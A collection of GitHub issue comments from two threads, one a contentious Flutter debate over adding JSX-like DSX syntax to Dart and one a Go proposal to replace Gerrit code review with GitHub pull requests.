
> And.. you know... flow come from fb too:

Flow is just like TypeScript: a static type checking system for Javascript. It is not a React tool, nor was React designed to be used with it. React is first and foremost a Javascript library, and JSX was designed to be used with React. Whatever secondary tools and utilities get introduced into React development are ultimately irrelevant to React+JSX interoperability.

> Please, stop selling arguments for and against extensions you've never use. I use JSX every day and I'm happy with it ATM, although I was very skeptical about it. I can imagine, that JSX evolves in other patterns, like it was with AngularJS.

I have used JSX, and though I do have personal opinions of it, I have deliberately left those opinions out of this discussion. In fact, had you read my previous comments, you would know that I had praised JSX for revolutionizing UI development in React. Other than some mildly tangential comments I've made about the market penetration of JSX as a whole, my arguments have been specifically about JSX _in Flutter_. And on that topic, there is no practical basis to determine the efficacy of DSX, so all we can do is examine how JSX has been implemented in other places, and that examination does not bode overly well.

Unless, of course,  you've been using DSX every day as well and can enlighten us on the practical advantages of using DSX in Flutter?

> And maybe this topic helps to find better pattern for Dart? DSX is just one proposal. Look at builder pattern example above or other language tweaks presented here. And, well, maybe your flui is a better way? I don't know. But let's find it out and help to each other to improve their suggestions instead of discussing about bad things in someones else proposal.

_That is what I'm doing._ DSX is being proposed as a UI solution for people familiar with JSX. There are key design elements in JSX that were intended to be used for an environment completely different from Dart and Flutter. _Those differences need to be addressed for DSX to be successful._ I am not being a _hater_. I'm trying to promote constructive discussion and ask the important questions. Yet all the responses I've been getting has amounted to subjective tautology (""JSX is good because it's the future, and it's the future because it's good""), dismissive hand-waving of crucial design points (""DSX does not need to account for differences between JS and Dart because there aren't any""), or just plain hostile (""You obviously don't like JSX so stop talking about DSX"").

You do not make a successful product solely with unadulterated praise. It needs to stand up to and account for criticism as well. People showing up and saying ""OMG yes please, make DSX"", while uplifting, is not helpful. There have been several people throughout this thread that have brought up perfectly valid criticisms of DSX, both with its initial design and with the concept as a whole. And for the most part, many of these criticisms have yet to be directly addressed, with the general attitude being dismissive.

My only fear is that all this unconditional love for JSX is preventing people from viewing DSX objectively. I get why you guys want something like JSX in Flutter, and I can relate - my opinion that Flutter needs a dedicated UI DSL is what lead me to create flui. But if the only people allowed to talk about DSX are the people who have nothing but good things to say about it, then it _will_ fail."
3037	"Can we recenter the discussion on this topic?
In fact, I don't see any reason to keep this issue open.

Dart team stated that they have other priorities. And the pro JSX side volunteered to make their own DSX implementation

Maybe we should just have a few open source repository proposing different solutions (even barely working). Such as DSX, or templates.
And then consider redirecting from Flutter's readme or awesome_flutter to these repos. And if there's anything blocking a DSX implementation, create another issue with the specifics.

Then let the community do its job."
3038	Leave it opened as is because people will continue to open new tickets asking for JSX (as it has already happened twice before). 
3039	"> Leave it open as is because people will continue to open new tickets asking for JSX (as it has already happened twice before).

The difference here is that we would now be able to answer with the following :

""We don't plan on implementing this in dart/flutter for now. But you can take a look at community alternatives [here] and [there] or read [this issue]""

and close the issue as duplicate. 
"
3040	One place for comments and votes and it is here. The request for JSX-like functionality is not going away and the ticket is opened because it needs Flutter tools support (compiler & VS Code IDE) and I have updated the ticket request with this info (first comment). If an enormous number of people starts asking for this, it will give the Flutter team incentive to put resources into it. 
3041	"Looks like most of the controversy here is not around JSX at this point, but DSX. I'd suggest splitting DSX discussion into it's own thread and leave this one generic to JSX.

In the end DSX is just one way of getting something closer to JSX so we shouldn't be mixing these two discussions in one thread regardless."
3042	"Big no for this, i really think that 1 language only is a big gain, jsx syntax will come with more things like separation of xml from js, etc... Not good.

thats my opinion."
3043	That's the longest and pointless Github issue I ever seen.
3044	"@cbazza Good job 👍
DSX + 1"
3045	"@BarryYan, Thank you
"
3046	"Please avoid this kind of comment, be it ""+1"" or ""Thanks"". 
This sends an email to all subscribers for nothing interesting. "
3047	"> Please avoid this kind of comment, be it ""+1"" or ""Thanks"".
This sends an email to all subscribers for nothing interesting.

Nothing interesting to you !!! 
Please avoid telling people what they can say or do and focus only on what you can say or do.
"
3048	"@cbazza

Dude, it's basic etiquette. Any new message on this thread emails everyone subscribed to it, so it's rude to post comment that doesn't contribute to the discussion because it annoys people for no reason. Basic reactions like ""+1"" and ""Thanks"" can be conveyed with a simple thumbs up reaction, so just do that.

That being said, if this thread has really devolved into arguing over whether someone should or shouldn't post a ""+1"" message, that's a big red flag that all constructive discussion has officially died, and it really should be closed (perhaps permanently this time)."
3049	"@andrewackerman,

Got it but while you are at it perhaps you should also consider basic etiquette while blasting this thread with your novels (long & fictional writing). 

Please stop spreading FUD (fear uncertainty & doubt) with your spray-and-pray barrage of senseless questions (you know, throw as much crap on the wall and see if anything sticks) and demands. 

After all your writings you haven't added any value to DSX so I have no interest having a discussion with you on this subject. Your motive is obvious though, promote FLUI while blasting DSX.

Tell me something, do you have answers to your own questions when they are applied to FLUI? Let's discuss FLUI for a bit shall we?
"
3050	"@cbazza 

> Got it but while you are at it perhaps you should also consider basic etiquette while blasting this thread with your novels (long & fictional writing).

The fact that you refer to my responses that I put a lot of time and effort into being as well-thought-out and unbiased as I can make them as ""long & fictional writing"" illustrates a lot about your character  and how you are approaching this discussion. I'm trying to promote discussion regarding very real issues surrounding any implementation of JSX in Flutter, while you lambast anyone with any form of contrary opinion. Which of us is the bigger offender of basic etiquette?

> Please stop spreading FUD (fear uncertainty & doubt) with your spray-and-pray barrage of senseless questions (you know, throw as much crap on the wall and see if anything sticks) and demands.

The only thing I am ""demanding"" is that you address the numerous issues brought up by many people regarding DSX with more than either a hand-wave or open hostility. For someone who is proposing a significant change/addition to Flutter's feature set, I feel like that's not an unreasonable expectation.

> After all your writings you haven't added any value to DSX so I have no interest having a discussion with you on this subject. Your motive is obvious though, promote FLUI while blasting DSX.

I'm asking _you_ to defend your position. You've repeatedly said that JSX/DSX is the best/future, but have yet to explain how or why. Several people have expressed valid concerns about DSX, but instead of addressing them, you wave it off by hiding behind the counterargument ""if you don't like it, don't use it"". My ""motive"" is to get you to answer questions that need to be asked regarding _any_ technical project, first and foremost being why people should ever use it over the alternatives. (And as I have explained before, familiarity is not a good enough reason.)

As far as FLUI is concerned, all I am doing is proposing an alternative solution to the overall problem (UI declarative syntax for Flutter) while requesting that people do the same to it that I am doing to DSX - offer sincere and constructive criticism. I am not saying that FLUI is objectively better than DSX - I'm proposing an alternative formed from a different approach to UI development and asking people to form their own opinions. 

(I'd also like to point out that, other than my initial mention where I was proposing a possible alternative approach to GUI representation, the only times I've ever even talked about FLUI is when you brought it up. So how does it makes sense that my ulterior motive is to promote it when you are talking about it more than I am?)

> Tell me something, do you have answers to your own questions when they are applied to FLUI? Let's discuss FLUI for a bit shall we?

FLUI is not DSX - it doesn't have to answer _every_ question that I posed to you regarding DSX because many of them are specific to DSX's design. That's not to say that it doesn't have its own set of questions that need to be answered, though, and no, I don't have all those answers. That's _why_ I value critical discussion - FLUI/DSX aren't going to stand up to the court of public opinion unless they can survive getting raked across the coals a couple times. This is not the appropriate place to discuss FLUI though. If you want to discuss FLUI at length, the project has its own [issue board](https://github.com/andrewackerman/flui/issues), so feel free to post there.

Instead of responding to criticism, you've instead been defensive and evasive, so much so that you are directly responsible for the two separate occasions (approaching three) where this thread had to be temporarily closed due to things getting too heated. So I'm going to break from ""etiquette"" and say this once: shelf your ego, stop interpreting criticisms as personal attacks, and answer the important questions. Either that, or make peace with DSX never getting off the ground."
3051	"andrewackerman Good job 👍
\+ 1"
3052	"@andrewackerman

> Good job

Dude, you get a compliment from @jstansbe which conveys a lot more information than a thumb up and you thumb down on the compliment? 

Obviously you didn't take my hint on length to heart but don't come to conclusions about my character because you don't know me at all.

> The fact that you refer to my responses that I put a lot of time and effort into being as well-thought-out and unbiased as I can make them

That I appreciate and I read all your 'long writings', answering everything: no way, but when I answer properly you don't understand my answer and concludes that I am being dismissive. 

It is obvious to me that you are not very experienced with JSX, you really don't understand how it works. So instead of doubling down just own it and I'll explain it in more detail. For example JSX & DSX only does the following 2 transforms (mentioned several times before):

```
(1)
<A property=""a"" />
    becomes
new A(property: a)

(2)
<A property=""a"">
  <B />
  <C />
</A>
    becomes
new A(property: a, children: <Widget>[new B(), new C()])
```

Everything else is handled by the host language, so for example: how does it handle import of components named the same; answer: host language. I am not being dismissive, it is the way it is designed and the source of it's strength. You see if you separate markup and programming into separate files, you start to duplicate the programming inside the markup with simple constructs for 'if', etc. You end up building a declarative programming language inside the markup that can never be as powerful as the main programming language. So by bringing the markup into the programming language you have the best of both worlds and that's the power of JSX/DSX.

Notice above on (2) that the transform hardcoded `<Widget>` and that's not always the case, so now you can specify that if needed as discussed before. Look at the transforms and now all symbols come from source or can be specified so there won't be some major magic gotchas in the future. 

> while you lambast anyone with any form of contrary opinion.

That's not true, you can have contrary opinion but you can't claim something true when I can proof otherwise.

> For someone who is proposing a significant change/addition to Flutter's feature set, I feel like that's not an unreasonable expectation.

But that's the thing, I wanted the Flutter team to implement DSX but then I did it so what they need to implement is generic stuff that doesn't depend on DSX and DSX is not the only beneficiary. The browser js engine supports source maps which enabled an ecosystem of new languages in the browser that transpiled to js; it enabled the creation of Dart !!! and several others (Coffeescript, Typescript, Reason, etc). Dart could do the same now and benefit from the ecosystem that it helps bring up, all boats rise.

> I'm asking you to defend your position. 

I've already done it many times and the conclusion is that Plain Dart or DSX comes down to user preference; and the important thing is to provide option instead of forcing people one way. 

> first and foremost being why people should ever use it over the alternatives.

I would use DSX because I prefer it, like spaces or tabs, type definition before or after the variable name. There is no point fighting for it, just accept that people have different preferences; there is more than 1 programming editor out there right? 

> familiarity is not a good enough reason

Just your opinion, why do we use ""if"" statements in almost every language, 'for' statement, 'class', and now 'asyn/await'. 

> This is not the appropriate place to discuss FLUI though. If you want to discuss FLUI at length, the project has its own issue board, so feel free to post there.

Very good, now you gained my respect. 

> you are directly responsible for the two separate occasions (approaching three) where this thread had to be temporarily closed due to things getting too heated.

Thing is even if it gets closed again it won't stop people from asking for JSX-like capabilities. 

> shelf your ego, stop interpreting criticisms as personal attacks, and answer the important questions. 

I have no ego but I do have short temper so there is no mistaking when someone pisses me off (it comes out right away). Not to offend you but your questions were not important. 

> Either that, or make peace with DSX never getting off the ground.

You are not the meter used to measure success and you don't know what I am up to.

"
3053	"> Dude, you get a compliment from @jstansbe which conveys a lot more information than a thumb up and you thumb down on the compliment?

You apparently didn't pick up on the sarcasm inherent in his comment. (He literally did everything I said not to do.) While a fun bit of trolling that I can appreciate, it's not appropriate here. And if, by chance, he was being sincere, then I apologize for my snideness, but my point still stands - that kind of comment is _still_ not appropriate here.

> It is obvious to me that you are not very experienced with JSX...

Did my disclaimer in my very first comment on this thread perhaps tip you off?

> ...you really don't understand how it works.

You equate me not having much experience with JSX and me not knowing how it works at all? While I've never worked on any serious React project, I've done my fair share of tinkering. I understand perfectly well how it _works_.

> Everything else is handled by the host language, so for example: how does it handle import of components named the same; answer: host language.

And that makes sense in the case where the markup language and the host language are distinct. With JSX, the markup language is designed as an _extension_ of the host language. As such, JSX was designed as an extension of JS, and that's why it works as well as it does. DSX is an implementation of JSX for Dart. 

You don't see the problem there? A markup language designed as an extension of one language being jerry-rigged into a foundationally different language. It is _inevitable_ for there to be a load of issues, edge cases, and considerations.

> You see if you separate markup and programming into separate files, you start to duplicate the programming inside the markup with simple constructs for 'if', etc. You end up building a declarative programming language inside the markup that can never be as powerful as the main programming language.

First, the whole idea behind separating markup and programming is that, if you are doing it correctly, there is a clear separation between the two which results in _no_ duplication. 

Secondly, if you are doing anything much more complex than `if`s and `for`s in your UI code (which are constructs that can easily be handled in many markup solutions), then I would argue that it's a sign there is something wrong in your design anyway. As per MVC/MVVM design principles, if you are incorporating complex logic in your UI constructs, that's a potential sign of smelly code and you should seriously consider a redesign anyway.

(That's not to say that you _can't_ write declarative UI in the MVVM fashion using JSX, but it's just something that invites trouble for little objective gain. Why use something in which you _can_ write code that is standards-compliant when you can use something that makes it difficult to write code that _isn't_?)

> That's not true, you can have contrary opinion but you can't claim something true when I can proof otherwise.

You haven't ""proved"" anything. You've given a bunch of subjective claims that have yet to be backed up with any substantiating logic. (Though to your credit, this latest post is a big improvement.)

> But that's the thing, I wanted the Flutter team to implement DSX but then I did it so what they need to implement is generic stuff that doesn't depend on DSX and DSX is not the only beneficiary.

You are still asking for them to do non-trivial stuff, so the onus is on you to convince them and the rest of us why they should and why it's so important that they should push down other things on their to-do list.

> The browser js engine supports source maps which enabled an ecosystem of new languages in the browser that transpiled to js; it enabled the creation of Dart !!!

It is in the nature of JS itself that such a thing is easily doable (relatively speaking), so much so that Dart is far from the only language that has a transpiler to JS. As I have pointed out many times, Dart is not JS. It is static and strongly typed, meaning a lot of things that would be easy to do in JS are hugely complex in Dart.

> I would use DSX because I prefer it, like spaces or tabs, type definition before or after the variable name. There is no point fighting for it, just accept that people have different preferences; there is more than 1 programming editor out there right?

By that logic, I should make a UI solution in which you define constructs using hex-encoded braille. I mean, if all that really matters is personal preference, all I need to say to defend its existence is that ""some people prefer it"", right?

You are developing a tool that you intend for other people to use, so you need reasoning beyond ""some people might like it"" to make yourself convincing. If you can't put it into words _why_ they should use it over something else, then what makes you believe that they will? And what's there to incentivize you to _ensure_ that they will when designing DSX's feature set?

> Just your opinion, why do we use ""if"" statements in almost every language, 'for' statement, 'class', and now 'async/await'.

First, those keywords (aside from `async/await`) became common programming lexicon because of the immense popularity of languages like C and BASIC over the course of several decades. As I've mentioned before, JSX is far from proven in its longevity - it's been around for 5 years and is yet to see any significant use outside of React despite the option being available.

Second, there's a big difference between familiarity and convention. `if`, `while`, `for`, `struct`, `class`, `enum`, `try/catch/finally`, `async/await`... those are all great ways to verbally represent a concept. There are reasons to defend using those keywords beyond them just being what people are familiar with - they make conceptual sense. (Of course, that doesn't mean that they are constants. Some languages do `if ... then`. Some do `if ... elif` while others do `if ... else if` and still others do `if...endif`. Some do `foreach`, others do `from`. And so on, and so forth.)

Meanwhile, the argument to use JSX because it is ""familiar"" doesn't fit the same category. JSX is one way to represent declarative UI, but it is neither the only one nor the most popular one. Furthermore, it was designed to be used in one type of environment, so using it in another environment can turn familiarity into a bad thing - familiarity leads them to expect it to work more or less exactly the same way it works elsewhere, so if it doesn't then that leads to a mental disconnect which is something that you want to _avoid_.

> Thing is even if it gets closed again it won't stop people from asking for JSX-like capabilities.

They ask for it anyway, and the issue gets redirected here all the same. I don't see how the thread being closed would change that.

> You are not the meter used to measure success and you don't know what I am up to.

Read any book about product design. Chapter one is always about creating a statement, a manifesto, a slogan, anything tangible and expressible in plain English that describes what the product is and why people should care about it. There's a reason that the most common form of advice given to amateur entrepreneurs is to make an ""elevator pitch"", something that clearly and concisely communicates the product and the draw in 30 seconds or less. If you can't put it succinctly why people should use your product, it's a sign that it's suffering from an identity crisis. If the person designing the product can't adequately respond to criticism, then that gives the impression of a lack of faith in their own product. Both of those things are big red flags to investors.

In this situation, the product is DSX, and the investors are developers considering using it. The only people you have backing you are people who apparently would unconditionally cheer on anything with ""JSX"" in the description. Every other person in this thread I have seen question what you are doing has walked away seemingly unconvinced following your answer. 

You are currently sitting at or near a 0% conversion rate, and _that's_ where I'm coming from when I say that you have yet to adequately respond to criticism. Maybe you don't care, but if you seriously intend for DSX to be a UI declaration markup plugin usable and used in real-world projects, you might want to start.

But then again, maybe you are an exception."
3054	"Ok this conversation has gone well beyond the kinds of discussions that we consider acceptable in the Flutter community, and so I'm going to lock this thread and close the bug. Please consider reading https://flutter.io/design-principles/#conflict-resolution for more details on how we behave here.

The next step if anyone wants to contribute code to address this issue would be to come up with a design for how to do build system integration such that we can have code generation work with Gradle, Xcode, hot reload, and integration with existing apps. If anyone is interested in working on this, please don't hesitate to reach out to me. Otherwise I expect this is something we'll work on early next year. Once we have a mechanism to do that, solutions like DSX will be easy to integrate into the Flutter ecosystem. We may even find solutions that should be integrated by default. In the meantime we're also working on improvements to Dart's syntax to see if we can make UI expressions even easier to write.

I would like to ask that people do not open new bugs on this topic unless there is something very constructive and new that is worth bringing up."
3055	"too hard to contribute, can't agree anymore!

"
3056	"I've heard on the Gotime podcast and Q&As with the Go Team that Gerrit provides a better experience when it comes to reviewing pull requests.

My question is, what makes a strong argument for Gerrit that Github cannot provide?"
3057	"> I ran through the contributing workshop at Gophercon 2017. I even had gone through half of it before. I still needed help from one of the guides. It was still arduous. I speak as someone who has written Go professionally 40 hours a week for over 4 years - the contribution workflow deters me from contributing to the Go project. Even after signing up. The fact that it's so different from my everyday workflow just makes the hill to climb too steep.


I've been writing Go for over five years and contributing in various forms, and I have to say I agree.  `go-contrib-init` makes things better, but the barrier to contributing to Go is a lot higher and with a different workflow from almost any other project that *uses* Go.


Gerrit does provide a better experience for code review than Github does, though that difference has shrunk over time. At the time Go migrated to Github from Google Code, Github didn't even support split views for diffs! Gerrit still supports a number of things that Github doesn't, but the difference has narrowed significantly. And in my opinion, the opportunity to have more contributors and contributions is enough of a benefit to outweigh the product advantages that Gerrit has when viewed in isolation."
3058	"I couldn't agree with this enough, one of the things I hear most in the wild is how hard it is for people to contribute to Go. As successful as the contributor workshop at Gophercon was, it is an embarrassment to the language that we had to do it at all. Why did we need an entire seminar to teach hundreds of developers who **already contribute to many other open source projects** how to contribute to Go? I think the avenue in which we interact with the Go source code is hands down the culprit.

If we need concrete data in the guise of **experience reports** I am happy to provide it.. But honestly I think this issue is probably going to turn out as enough."
3059	"I agree that GitHub is closing the feature gap, but Gerrit reviews are still a different experience, which I personally find superior. So I think this should configure as a discussion on the tradeoff between review experience and new contributor experience.

But there seem to be two other sentiments in the proposal which I feel like are unrelated and personally disagree with.

First, that **GitHub is ""the one true way""**. I don't take seriously the complaints at the other end of the spectrum like ""git was supposed to be decentralized!!!11!"" either, but ""it's not GitHub"" should not be an argument against a workflow per-se, beyond the onboarding inertia, nor does all code *need* to be hosted on GitHub.

Second, the Google ownership part. Technical infrastructure is IMHO both much less important than people (which the Go team seems to be aware of and working on) and wider than Gerrit. TryBots run on Google infra, releases run on Google infra, the website runs on Google infra. And personally I'm glad the community doesn't have to piece it together."
3060	"Back when I hosted my code on BitBucket and mercurial I noticed that people would download my hg repo, make their changes, and then upload it to GitHub, and never sent me a patch.

Obviously not great. So, I moved everything to GitHub. Not because I especially like GitHub, but because git and GitHub have become the de-facto idiomatic tools for open source software development.

I still consider mercurial/BitBucket to be superior – but GitHub is certainly an *adequate* solution, and using idiomatic solutions is an advantage in and of itself. In that sense it's similar to the Go proverb of ""~gofmt~ GitHub is no one's favourite, yet ~gofmt~ GitHub  is everyone's favourite"".

I would say that the question ""is Gerrit better than GitHub reviews?"" is the wrong one. The question should be ""is Gerrit so much better that we want to skip out potential contributions?""

I don't have to work with these tools daily, so I don't presume to be able to answer that question. We work with GitHub reviews daily at my day job, and while it's certainly not the best system I've worked with, I do find it an *adequate* system."
3061	"We disagreed a bit on Twitter, but I do share your sentiments.

Switching to GitHub means GH is the sole source of truth for Go. This means if anything happens to GitHub—outages, data loss, whatever—or if GH does anything to its product—API limits, changes that break Go's workflow, etc—Go is out of luck. The Go project can avoid those problems if it uses an OSS tool, like Gerrit or GitLab.

Like I mentioned on Twitter, I wonder if the onboarding process could be made smoother if the docs received some TLC. (That doesn't speak to the part of your issue about Google's ownership, however.)"
3062	"Agreed. I'd be much more inclined to contribute if not for the contribution process. 

One of my previous contributions was closed due to inactivity. I submitted it ages and ages ago, and had no idea it had been reviewed or commented on. After a long time, it was closed cause I didn't respond. 

I happily would have responded and finished out the change had I received notification that it had been reviewed. No idea why I didn't get an email or some kind of notification, but I simply threw up my hands at that point. Not worth the rigamarole. "
3063	"I don't really think it's worth worry about ""what happens if GitHub does X"".  If that happens, Go can move somewhere else (presuming there's off-GitHub backups, which I didn't even bother to mention because of course there would be).   But in reality, github's not going anywhere, and they're not going to do anything to screw up the hen that lays the golden egg.

You might as well say ""what if Google goes under?""  I mean... they actually *have* closed down one of their source control hosting services :)

"
3064	The language spec is easier to read than the contribution guidelines
3065	@natefinch I'm not sure if there *are* tools to backup github issues, but if there aren't, that's yet another reason to switch wholeheartedly to github: the same things which make github better for the Go team will make it better for everybody.
3066	"bravo! I wanted to help add support for negative numbers in text/scanner and see the collaboration guide does not invite me to do it

registering a google account on a mandatory way, or accepting a contract to cede code to a project that is already OSS, sucks."
3067	As a person who reviews patches, it seems to me that Gerrit continues to provide a much better mechanism for patch review than Github.  Even with our current contribution process, there are many many more contributors than there are reviewers.
3068	@nasciiboy Whether we use Gerrit or Github, all contributors will be required to sign the CLA to give us rights to distribute the contributed code.  That is non-negotiable.
3069	Yeah, I wasn't assuming the CLA would go away, but hopefully it could be a trivial click through process that could use your GitHub id so you don't have to sign up for anything.
3070	">I speak as someone who has written Go professionally 40 hours a week for over 4 years - the contribution workflow deters me from contributing to the Go project. Even after signing up. The fact that it's so different from my everyday workflow just makes the hill to climb too steep.

I agree completely with this, but at the same time it doesn't feel right to expect the top contributors to tailor the workflow for the rest of the potential contributors. It seems important, at least to me from a quality standpoint, that those who review the most code have the easiest time doing it, as they are the gatekeepers of quality. 

I'm not saying it should be harder to contribute to keep contributions away, just that the write-access (or pull access) should not be optimized at the expense of read access (code review, ease of use, etc)."
3071	"I myself had kept away from contributing due to this very reason for a very long time. Recently though, I just sat down and forced myself to go through the contributor [doc](https://golang.org/doc/contribute.html). Hardly took me 15 mins, and then I was up and running ! And this was even before `go-contrib-init` came out !

Yes, the gerrit workflow is something new, and like anything new, people (including me !) are reluctant to put themselves through the time and energy of learning that. But IMHO, its too small of a learning curve to complain about.

Agree with @ianlancetaylor that Gerrit does provide a better way to review patches.

And like @FiloSottile said, the TryBots do run on Google hardware. If we are talking about moving away from Google completely, I doubt one can run tests on _all_ platforms and with the speed the current TryBots do."
3072	"Not relying exclusively on Github doesn't make a project any less community-driven. It simply does not compute.

You make it sound as if Go was some kind of weird outlier when in fact it is *very* common for bigger open source projects to use Github mostly as a fancy mirror while the primary repo and code review live somewere else."
3073	Just drop the CLA entirely. This is corporate nonsense used to make the lawyers feel happy and benefits none of the hackers. Everyone knows that inbound=outbound. #NoCLA 
3074	I'd love to see GitHub doing some improvements to the comment handling. There is currently no way of drafting replies when replying to a code review, or there is no mechanism that counts the addressed and non-addressed issues. It is a major step down if you are reviewing long and complicated patches, the way the Go project often does.
3075	"Please drop talk about the CLA. If you want to propose that, make your own
proposal.

On Thu, Sep 21, 2017, 1:03 AM James <notifications@github.com> wrote:

> Just drop the CLA entirely. This is corporate nonsense used to make the
> lawyers feel happy and benefits none of the hackers. Everyone knows that
> inbound=outbound. #NoCLA
>
> —
> You are receiving this because you were mentioned.
> Reply to this email directly, view it on GitHub
> <https://github.com/golang/go/issues/21956#issuecomment-331051660>, or mute
> the thread
> <https://github.com/notifications/unsubscribe-auth/ADCcyH3bMlx3OJHmGYlhzawuK2mS9yTLks5ske4RgaJpZM4Per9v>
> .
>
"
3076	@rakyll GitHub fleshed out their review system quite a bit in the past 6 months - 1 year. Pull Request Reviews work such that you can write a bunch of comments as drafts (and edit/delete them) and then send the review as a single batch, like Gerrit. See [this](https://help.github.com/articles/reviewing-proposed-changes-in-a-pull-request/) and [this](https://help.github.com/articles/about-pull-request-reviews/), for example.
3077	"I don't care about the CLA or where the main repo is. It's just too hard to contribute.

Gerrit might be nice if you use it all day or even once a month, but, if you look at it maybe once a year, it's a mess.

The rest of it isn't that bad, though the contribution guidelines are hard to skim. It's not bad if you actually read it but if you just open it up with the goal of ""to do X I need to do Y"", well, buckle in. By the time I figure out what to do I've lost any steam I had to actually do it. Eventually after many months, I'll try again but by then I've forgotten what to do and the cycle repeats."
3078	@cespare You can only create an initial draft. Responses to the initial comments cannot be drafted. Am I mistaken? I use GitHub PRs for everything else and it is such a chaotic experience even for tiny projects.
3079	"This proposal is based on things that I disagree with almost entirely. Moreover, some of them are IMO false.

Several people agreed to the claim that's it's hard to contribute. Yeah, you may have to learn a couple of new things. Maybe you make some mistakes in the first case. Trial and error, less than 30 minutes, I guess, and basically only once and forever. We are programmers, we are used to learn new things every single day of our profesional life - or we are soon out of business. (Good luck to the exceptions.)

TL;DR: I see very little technical ground justifiyng the proposal. Only same strange mix of activism and/or policy making. I am very much against.
"
3080	"@rakyll Yes, I think you're mistaken. You can respond to a PR review by doing your own review which works the same way (except that you can't approve/disapprove your own PR). You do this by responding to a comment with ""Start a review"" rather than ""Add single comment"". I think this is only available on the ""Files changed"" tab, not the ""Conversation"" tab (not sure why). See pic:

![screen_20170920223353](https://user-images.githubusercontent.com/318501/30680382-1cc09d04-9e54-11e7-9fdb-d691a8a1ec24.png)
"
3081	"I don't have strong opinion.

Go developer team have to manage issues or pull-requests which is not really issue. For example, complaints, dissatisfaction, biased benchmark results. If PR will be opened, meaning-less PR possibly be sent. I have seen a pull-request where all sources are deleted in other project. Ofcourse, we doesn't want it.

Also since we can do anything on GitHub with only few clicks, there are possibly mistakes that will occur. This can be recovered but it should be carefully. For example, the counting of LGTMs like Gerrit (maybe rakyll mentioned).

I think that using Gerrit still have meaning since gerrit have better way for reviewing. In other thing, I am not a Google believer, but I think, Not to use GitHub may be possible way to raise the contributor's threshold. (Please do not treat this as wrong) This can ignore users who doesn't have development intention that mentioned above.

IMO, I don't think it's not hard to contribute to Go as you think."
3082	"This proposal is rather large in scope and the discussion could be more productive if broken out into more specific bits to avoid derailment (talking about the CLA, for example). The primary (and most contentious) issue seems to be that of moving away from Gerrit to use GitHub PRs for code review. I suggest you make this proposal more specific to that issue, because it's the one that a lot of your other sub-proposals hinge on.

I 100% agree that it is more difficult to propose a change to Go than to say, Kubernetes. This experience is something we're trying to improve on and the contributor workshop at GopherCon was a great demonstration of the roadblocks some of our community members run into by using Gerrit and our current tooling. We should do better.

While switching to GitHub would potentially make a contributor's workflow more straightforward, the same cannot be said indefinitely for the reviewers. Switching to GitHub PRs would regress the review experience for many, so the success of this proposal hinges on identifying those regressions and either convincing the maintainers that the corresponding benefits outweigh the sacrifices, and/or coming up with a plan to build tooling to fill in the gaps left by switching."
3083	"Restricting developers because of a cumbersome process is not good imho. I think anything that makes it easier to contribute is good and this proposal is definitely a step in the right direction.

I wonder if the arguments ""You will get used to Gerrit"" can't be just as easily applied to Github and it's different review process. Perhaps using Gerrit is more about habit than it being actually better?"
3084	"> I think anything that makes it easier to contribute is good and this proposal is definitely a step in the right direction.

That statement is easily proven false. Requiring no code review at all would make contributions easier, yet wouldn't be at all a good change.

> Perhaps using Gerrit is more about habit than it being actually better?

The various reasons for why Gerrit is a better tool have been presented before, here and in previous threads discussing why Go uses Gerrit instead of GitHub. Furthermore, it cannot be about habit – when the Go issue tracker and code mirror moved to GitHub, Go was using Rietveld, not Gerrit. Using Gerrit instead of GitHub was an active decision, based on arguments that hold true to this day, arguments that this proposal doesn't address. In fact, this proposal is only concerned with making contributions easier for first-time or infrequent contributors, and doesn't take the point of view of reviewers and frequent contributors into consideration at all."
3085	"I've worked in some places where we've migrated from GH Pull Requests to Gerrit for the reason that GH Pull Requests (until very very recently) were not ideal for a formal review process. Even with the recent changes, the current PR system in GH does not manage revisions of a changeset well. For example, Gerrit includes the commit message as part of a review which is arguably the most important part of keeping a clean and detailed history.

Larger projects then this are in Gerrit (hello Android) and Gerrit is a well maintained and up to date piece of software. If you know Git well, Gerrit is great. Github hides a lot of things from you. The documentation for Gerrit is likely the issue - I've written a lot of 'Day in the life of' Confluence pages explaining Gerrit to people.

The argument that the process of pushing to a different endpoint is cumbersome? Really? That does seem far-fetched. The setup process for a new contributor has massively improved over time as well. It used to be a lot more difficult."
3086	"http://nurmi-labs.blogspot.com/2017/01/patching-ess.html

I recall earlier this year regarding collaborating on a minor patch of ESS, when one of those involved mentioned a Github pull request, the reply from the coder to whom the subject was addressed was that he has an epidermic reaction to such large & centralized entities.

I would prefer if Go would continue to utilise the Gerrit project.

I like the corporate and individual CLAs.

https://golang.org/doc/contribute.html#auth

""Gerrit uses Google Accounts for authentication.""

Though I would prefer there were implemented an alternate to the use of Google Accounts for authentication; and, indeed perhaps that information could be hosted on machines outside of the U.S.A., and, in that regard I would suggest the location of Bratislava."
3087	"That doesn't make it false @dominikh just falsifiable.

If Gerrit is truly better then why isn't it more widespread? It can also be argued that Gerrit is nost as good as the kernels way of using email and patches. Then you can use whatever tool you want to review and thats that so the fact that someone likes (""thinks X is better"") something isn't really an indicator other than that that person likes it."
3088	"Please don't do that. Githubs PRs (Bitbucket/Stash being no different) mimick plain git pull request and are simply inferior to Gerrit for what it should be used: Review and discuss a single change. It is just too easy to drop a PR containing all the ugly gore of its creation (the sausage making). The next step after switching to Github PRs will be adoption of gitflow, just because so many people are used to it and it would make their lives so much easier.

I agree that working with Gerrit and the codereview extension would benefit from a bit more documentation which could be more tasks focused. But the contribution process is not really complicated. Its git change and git mail and git sync. (I agree that change and sync and how they interplay with branches should be better documented).

If this is a open source political statement to host Go on Github then please do not mix it with the use of inferior tooling."
3089	"@natefinch I hope so! But, that's just the thing—the Go community has zero control over what GH does. Companies host their own repositories for this exact same reason. I think your proposal would do well to think about other OSS code review projects are both easier than Gerrit and that could be used instead of putting all Go's eggs in some corporate basket.

It's not that I have anything against GH or corporations, really, it's just that saying ""We must couple our infrastructure and tooling"" without considering decoupling them seems a bit... shortsighted to me."
3090	"Well @vdobler it has always seemed like a tooling issue and then it becomes a matter of taste unless it is actually too slow or simply doesn't work  but that is not case here.

I like Github and a lot of stellar developers and projects use nothing but Github so it is not about skill or competence but simply of taste. Thats my opinion at least."
3091	"Coding exercises (for fans of hg and git).

http://wiki.9front.org/bounties

fully functional, read/write hgfs

fully functional, read/write gitfs"
3092	"@vdobler If you think that gerrit is so great, why are you allowing GitHub PRs for your own projects like https://github.com/vdobler/ht and https://github.com/vdobler/chart ?

We want to use GitHub PRs for exactly the same practical reason that you accept GitHub PRs for your projects: every potential contributor already knows how to use GitHub for making contributions to GitHub projects.

I'm pretty sure if you were to tell people they have to read a contribution guide and use unfamiliar tooling, you would get zero contributions to your projects.

